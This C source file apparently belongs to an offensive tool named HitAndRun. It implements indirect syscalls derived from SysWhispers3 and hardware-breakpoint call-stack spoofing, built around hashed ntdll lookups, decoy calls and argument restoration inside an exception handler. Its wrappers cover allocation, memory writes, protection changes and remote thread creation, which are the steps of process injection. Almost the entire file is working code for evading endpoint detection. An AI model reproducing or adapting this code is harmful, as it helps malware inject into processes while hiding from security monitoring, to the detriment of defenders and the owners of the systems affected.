#include "HitAndRun.h"

DWORD tlsIndex;

#define ROR13(v) (((v >> 13) | (v << 19)) & 0xFFFFFFFF)

static DWORD ROR13Hash(const CHAR* funcName)
{
	DWORD funcHash = 0;
	for (DWORD i = 0; funcName[i] != '\0'; i++) {
		DWORD c = (DWORD)funcName[i];
		funcHash = ROR13(funcHash);
		funcHash = funcHash + c;
	}
	return funcHash;
}

//Hardware breakpoint related from https://gist.github.com/CCob/fe3b63d80890fafeca982f76c8a3efdf
static unsigned long long setBits(unsigned long long dw, int lowBit, int bits, unsigned long long newValue)
{
	unsigned long long mask = (1UL << bits) - 1UL;
	dw = (dw & ~(mask << lowBit)) | (newValue << lowBit);
	return dw;
}

// Dummy function for VirtualAllocEx redirection
static void DummyVirtualAllocEx()
{
	VirtualAllocEx(GetCurrentProcess(), NULL, 1, 0, 0);
}
// Dummy function for WriteProcessMemory redirection
static void DummyWriteProcessMemory()
{
	char buf[] = "1";
	void* lol = malloc(1);
	WriteProcessMemory(GetCurrentProcess(), lol, buf, sizeof(buf), NULL);
	free(lol);
}
// Dummy function for VirtualProtect redirection
static void DummyVirtualProtect()
{
	void* lol = malloc(1);
	VirtualProtect(lol, 1, 0, NULL);
	free(lol);
}
// Dummy function for CreateRemoteThread redirection
static void DummyCreateRemoteThread()
{
	void* lol = malloc(1);
	CreateRemoteThread(GetCurrentProcess(), NULL, 0, (LPTHREAD_START_ROUTINE)lol, NULL, 0, NULL);
	free(lol);
}

void EnableBreakpoint(CONTEXT* ctx, PVOID address, int index) {
	switch (index) {
	case 0:
		ctx->Dr0 = (ULONG_PTR)address;
		break;
	case 1:
		ctx->Dr1 = (ULONG_PTR)address;
		break;
	case 2:
		ctx->Dr2 = (ULONG_PTR)address;
		break;
	case 3:
		ctx->Dr3 = (ULONG_PTR)address;
		break;
	}
	ctx->Dr7 = setBits(ctx->Dr7, 16, 16, 0);
	ctx->Dr7 = setBits(ctx->Dr7, (index * 2), 1, 1);
	ctx->Dr6 = 0;
}

void ClearBreakpoint(CONTEXT* ctx, int index)
{
	switch (index) {
	case 0:
		ctx->Dr0 = 0;
		break;
	case 1:
		ctx->Dr1 = 0;
		break;
	case 2:
		ctx->Dr2 = 0;
		break;
	case 3:
		ctx->Dr3 = 0;
		break;
	}
	ctx->Dr7 = setBits(ctx->Dr7, (index * 2), 1, 0);
	ctx->Dr6 = 0;
	ctx->EFlags = 0;
}

BOOL PrepareAndSetBreakpoint(DWORD functionHash, PHIR_CTX pHirCtx)
{
	CONTEXT threadContext;
	threadContext.ContextFlags = CONTEXT_ALL;

	if (!GetThreadContext((HANDLE)-2, &threadContext))
		return FALSE;

	// Resolve addresses for function and syscall

	pHirCtx->pExceptionAddress = SW3_GetFunctionVAddress(functionHash);
	if (pHirCtx->pExceptionAddress == NULL)
		return FALSE;

	pHirCtx->pSyscallAddress = SW3_GetSyscallAddress(functionHash);
	if (pHirCtx->pSyscallAddress == NULL)
		return FALSE;

	pHirCtx->dwSSN = SW3_GetSyscallNumber(functionHash);
	if (pHirCtx->dwSSN == 0)
		return FALSE;

	// Enable breakpoints at the function and syscall addresses
	EnableBreakpoint(&threadContext, pHirCtx->pExceptionAddress, 0);
	EnableBreakpoint(&threadContext, pHirCtx->pSyscallAddress, 1);

	tlsIndex = TlsAlloc();
	TlsSetValue(tlsIndex, pHirCtx);

	SetThreadContext((HANDLE)-2, &threadContext);

	return TRUE;
}

EXCEPTION_DISPOSITION __cdecl __C_specific_handler(struct _EXCEPTION_RECORD* ExceptionRecord, void* Frame, struct _CONTEXT* ContextRecord, struct _DISPATCHER_CONTEXT* Dispatch)
{
	PHIR_CTX pHirCtx = (PHIR_CTX)TlsGetValue(tlsIndex);
	if (pHirCtx == NULL)
		return ExceptionContinueSearch;

	// FIRST HIT - at EXCP_ADDR (ntdll function first instruction)
	if (ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP &&
		ExceptionRecord->ExceptionAddress == pHirCtx->pExceptionAddress)
	{
		ClearBreakpoint(ContextRecord, 0);

		// Save context for later restoration
		pHirCtx->pSavedContext = (PCONTEXT)HeapAlloc(GetProcessHeap(), 0, sizeof(CONTEXT));
		memcpy_s(pHirCtx->pSavedContext, sizeof(CONTEXT), ContextRecord, sizeof(CONTEXT));

		// Redirect execution to the custom function
		ContextRecord->Rip = (DWORD64)pHirCtx->pRedirectFunction;
		return ExceptionContinueExecution;
	}

	// SECOND HIT - at SYSC_ADDR (syscall address)
	if (ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP &&
		ExceptionRecord->ExceptionAddress == pHirCtx->pSyscallAddress)
	{
		// Restore original stack arguments
		ContextRecord->Rcx = pHirCtx->pSavedContext->Rcx;
		ContextRecord->Rdx = pHirCtx->pSavedContext->Rdx;
		ContextRecord->R8 = pHirCtx->pSavedContext->R8;
		ContextRecord->R9 = pHirCtx->pSavedContext->R9;

		//printf("\n\n --debug begin-- \n\n");
		DWORD k = 0x1;
		// Restore stack values for arguments
		while (pHirCtx->dwStacksArgsNumber > 0)
		{
			DWORD offset = 0x8 * (0x4 + k);
			//printf("address on stack: %p - %p\n", exception->ContextRecord->Rsp + offset, SAVED_CONTEXT->Rsp + offset);
			//printf("values: %p - %p\n", *(ULONG64*)(exception->ContextRecord->Rsp + offset), *(ULONG64*)(SAVED_CONTEXT->Rsp + offset));
			*(ULONG64*)(ContextRecord->Rsp + offset) = *(ULONG64*)(pHirCtx->pSavedContext->Rsp + offset);
			//printf("new values: %p - %p\n\n", *(ULONG64*)(exception->ContextRecord->Rsp + offset), *(ULONG64*)(SAVED_CONTEXT->Rsp + offset));
			pHirCtx->dwStacksArgsNumber--;
			k += 0x1;
		}
		//printf("\n\n --debug end-- \n\n");

		ContextRecord->R10 = ContextRecord->Rcx;

		ClearBreakpoint(ContextRecord, 1);
		HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, pHirCtx->pSavedContext);
		TlsFree(tlsIndex);

		return ExceptionContinueExecution;
	}

	return ExceptionContinueSearch;
}

NTSTATUS CallNtAllocateVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect)
{
	HIR_CTX ctx;
	ctx.pRedirectFunction = &DummyVirtualAllocEx;
	ctx.dwStacksArgsNumber = 2;

	if (!PrepareAndSetBreakpoint(ZwAllocateVirtualMemoryHash, &ctx))
		return STATUS_INTERNAL_ERROR;

	return ((NtAllocateVirtualMemory)ctx.pExceptionAddress)(ProcessHandle, BaseAddress, ZeroBits, RegionSize, AllocationType, Protect);
}

NTSTATUS CallNtWriteVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T BufferSize, PSIZE_T NumberOfBytesWritten)
{
	HIR_CTX ctx;
	ctx.pRedirectFunction = &DummyWriteProcessMemory;
	ctx.dwStacksArgsNumber = 1;

	if (!PrepareAndSetBreakpoint(ZwWriteVirtualMemoryHash, &ctx))
		return STATUS_INTERNAL_ERROR;

	return ((NtWriteVirtualMemory)ctx.pExceptionAddress)(ProcessHandle, BaseAddress, Buffer, BufferSize, NumberOfBytesWritten);
}

NTSTATUS CallNtProtectVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize, ULONG NewProtect, PULONG OldProtect)
{
	HIR_CTX ctx;
	ctx.pRedirectFunction = &DummyVirtualProtect;
	ctx.dwStacksArgsNumber = 1;

	if (!PrepareAndSetBreakpoint(ZwProtectVirtualMemoryHash, &ctx))
		return STATUS_INTERNAL_ERROR;

	return ((NtProtectVirtualMemory)ctx.pExceptionAddress)(ProcessHandle, BaseAddress, RegionSize, NewProtect, OldProtect);
}

NTSTATUS CallCreateRemoteThread(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, HANDLE ProcessHandle, PVOID StartRoutine,
	PVOID Argument, ULONG CreateFlags, SIZE_T ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize, PPS_ATTRIBUTE_LIST AttributeList)
{
	HIR_CTX ctx;
	ctx.pRedirectFunction = &DummyCreateRemoteThread;
	ctx.dwStacksArgsNumber = 7;

	if (!PrepareAndSetBreakpoint(ZwCreateThreadExHash, &ctx))
		return STATUS_INTERNAL_ERROR;

	return ((NtCreateThreadEx)ctx.pExceptionAddress)(ThreadHandle, DesiredAccess, ObjectAttributes, ProcessHandle, StartRoutine,
		Argument, CreateFlags, ZeroBits, StackSize, MaximumStackSize, AttributeList);
}

//
// 
// The following code is a simplified version of SysWhisper3's original functions
// https://github.com/klezVirus/SysWhispers3/blob/master/data/base.c
//
//

SW3_SYSCALL_LIST SW3_SyscallList;

PVOID SC_Address(PVOID NtApiAddress)
{
	DWORD searchLimit = 512;
	PVOID SyscallAddress;

	// Assuming the process is 64-bit on a 64-bit OS, we need to search for syscall
	BYTE syscall_code[] = { 0x0f, 0x05, 0xc3 };
	ULONG distance_to_syscall = 0x12;

	// we don't really care if there is a 'jmp' between
	// NtApiAddress and the 'syscall; ret' instructions
	SyscallAddress = SW3_RVA2VA(PVOID, NtApiAddress, distance_to_syscall);

	if (!memcmp((PVOID)syscall_code, SyscallAddress, sizeof(syscall_code)))
	{
		return SyscallAddress;
	}

	// the 'syscall; ret' intructions have not been found,
	// we will try to use one near it, similarly to HalosGate

	for (ULONG32 num_jumps = 1; num_jumps < searchLimit; num_jumps++)
	{
		// let's try with an Nt* API below our syscall
		SyscallAddress = SW3_RVA2VA(
			PVOID,
			NtApiAddress,
			distance_to_syscall + num_jumps * 0x20);
		if (!memcmp((PVOID)syscall_code, SyscallAddress, sizeof(syscall_code)))
		{
			return SyscallAddress;
		}

		// let's try with an Nt* API above our syscall
		SyscallAddress = SW3_RVA2VA(
			PVOID,
			NtApiAddress,
			distance_to_syscall - num_jumps * 0x20);
		if (!memcmp((PVOID)syscall_code, SyscallAddress, sizeof(syscall_code)))
		{
			return SyscallAddress;
		}
	}

	return NULL;
}

BOOL SW3_PopulateSyscallList()
{
	// Return early if the list is already populated.
	if (SW3_SyscallList.Count) return TRUE;

	PSW3_PEB Peb = (PSW3_PEB)__readgsqword(0x60);

	PSW3_PEB_LDR_DATA Ldr = Peb->Ldr;
	PIMAGE_EXPORT_DIRECTORY ExportDirectory = NULL;
	PVOID DllBase = NULL;

	// Get the DllBase address of NTDLL.dll. NTDLL is not guaranteed to be the second
	// in the list, so it's safer to loop through the full list and find it.
	PSW3_LDR_DATA_TABLE_ENTRY LdrEntry;
	for (LdrEntry = (PSW3_LDR_DATA_TABLE_ENTRY)Ldr->Reserved2[1]; LdrEntry->DllBase != NULL; LdrEntry = (PSW3_LDR_DATA_TABLE_ENTRY)LdrEntry->Reserved1[0])
	{
		DllBase = LdrEntry->DllBase;
		PIMAGE_DOS_HEADER DosHeader = (PIMAGE_DOS_HEADER)DllBase;
		PIMAGE_NT_HEADERS NtHeaders = SW3_RVA2VA(PIMAGE_NT_HEADERS, DllBase, DosHeader->e_lfanew);
		PIMAGE_DATA_DIRECTORY DataDirectory = (PIMAGE_DATA_DIRECTORY)NtHeaders->OptionalHeader.DataDirectory;
		DWORD VirtualAddress = DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
		if (VirtualAddress == 0) continue;

		ExportDirectory = (PIMAGE_EXPORT_DIRECTORY)SW3_RVA2VA(ULONG_PTR, DllBase, VirtualAddress);

		// If this is NTDLL.dll, exit loop.
		PCHAR DllName = SW3_RVA2VA(PCHAR, DllBase, ExportDirectory->Name);

		if ((*(ULONG*)DllName | 0x20202020) != 0x6c64746e) continue;
		if ((*(ULONG*)(DllName + 4) | 0x20202020) == 0x6c642e6c) break;
	}

	if (!ExportDirectory) return FALSE;

	DWORD NumberOfNames = ExportDirectory->NumberOfNames;
	PDWORD Functions = SW3_RVA2VA(PDWORD, DllBase, ExportDirectory->AddressOfFunctions);
	PDWORD Names = SW3_RVA2VA(PDWORD, DllBase, ExportDirectory->AddressOfNames);
	PWORD Ordinals = SW3_RVA2VA(PWORD, DllBase, ExportDirectory->AddressOfNameOrdinals);

	// Populate SW3_SyscallList with unsorted Zw* entries.
	DWORD i = 0;
	PSW3_SYSCALL_ENTRY Entries = SW3_SyscallList.Entries;
	do
	{
		PCHAR FunctionName = SW3_RVA2VA(PCHAR, DllBase, Names[NumberOfNames - 1]);

		// Is this a system call?
		if (*(USHORT*)FunctionName == 0x775a)
		{
			Entries[i].Hash = ROR13Hash(FunctionName);
			Entries[i].Address = Functions[Ordinals[NumberOfNames - 1]];
			Entries[i].VAddress = SW3_RVA2VA(PVOID, DllBase, Functions[Ordinals[NumberOfNames - 1]]);
			Entries[i].SyscallAddress = SC_Address(Entries[i].VAddress);

			i++;
			if (i == SW3_MAX_ENTRIES) break;
		}
	} while (--NumberOfNames);

	// Save total number of system calls found.
	SW3_SyscallList.Count = i;

	// Sort the list by address in ascending order.
	for (DWORD i = 0; i < SW3_SyscallList.Count - 1; i++)
	{
		for (DWORD j = 0; j < SW3_SyscallList.Count - i - 1; j++)
		{
			if (Entries[j].Address > Entries[j + 1].Address)
			{
				// Swap entries.
				SW3_SYSCALL_ENTRY TempEntry;

				TempEntry.Hash = Entries[j].Hash;
				TempEntry.Address = Entries[j].Address;
				TempEntry.SyscallAddress = Entries[j].SyscallAddress;
				TempEntry.VAddress = Entries[j].VAddress;

				Entries[j].Hash = Entries[j + 1].Hash;
				Entries[j].Address = Entries[j + 1].Address;
				Entries[j].SyscallAddress = Entries[j + 1].SyscallAddress;
				Entries[j].VAddress = Entries[j + 1].VAddress;

				Entries[j + 1].Hash = TempEntry.Hash;
				Entries[j + 1].Address = TempEntry.Address;
				Entries[j + 1].SyscallAddress = TempEntry.SyscallAddress;
				Entries[j + 1].VAddress = TempEntry.VAddress;
			}
		}
	}

	return TRUE;
}

DWORD SW3_GetSyscallNumber(DWORD FunctionHash)
{
	// Ensure SW3_SyscallList is populated.
	if (!SW3_PopulateSyscallList()) return -1;

	for (DWORD i = 0; i < SW3_SyscallList.Count; i++)
	{
		if (FunctionHash == SW3_SyscallList.Entries[i].Hash)
		{
			return i;
		}
	}

	return -1;
}

PVOID SW3_GetSyscallAddress(DWORD FunctionHash)
{
	// Ensure SW3_SyscallList is populated.
	if (!SW3_PopulateSyscallList()) return NULL;

	for (DWORD i = 0; i < SW3_SyscallList.Count; i++)
	{
		if (FunctionHash == SW3_SyscallList.Entries[i].Hash)
		{
			return SW3_SyscallList.Entries[i].SyscallAddress;
		}
	}

	return NULL;
}

PVOID SW3_GetFunctionVAddress(DWORD FunctionHash)
{
	// Ensure SW3_SyscallList is populated.
	if (!SW3_PopulateSyscallList()) return NULL;

	for (DWORD i = 0; i < SW3_SyscallList.Count; i++)
	{
		if (FunctionHash == SW3_SyscallList.Entries[i].Hash)
		{
			return SW3_SyscallList.Entries[i].VAddress;
		}
	}

	return NULL;
}